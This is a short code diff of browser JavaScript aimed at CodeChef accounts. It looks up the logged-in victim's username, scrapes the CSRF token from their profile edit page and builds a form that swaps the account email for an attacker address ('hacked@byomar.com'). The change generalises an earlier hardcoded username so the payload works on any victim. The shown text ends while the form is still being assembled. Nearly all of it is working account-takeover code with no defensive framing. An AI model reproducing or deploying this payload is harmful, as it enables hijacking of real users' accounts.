@@ -1,11 +1,13 @@
 var csrfToken;
-var username = "omargad92";
+const response = await fetch("https://www.codechef.com/api/user/me");
+const data = await response.json();
+const username = data.user.username;
 fetch('/users/' + username +'/edit')
   .then(r => r.text())
   .then(d => {
     csrfToken = (new DOMParser().parseFromString(d, 'text/html').querySelector('[id="edit-user-personal-info-form-form-token"]') || {}).value;
             
-        const email = 'hacked@byomar.com';
+        const email = 'hacked@byomar.com'; //hacker_email
         const op = 'Save';
         const formData = new FormData();
         formData.append('mail', email);
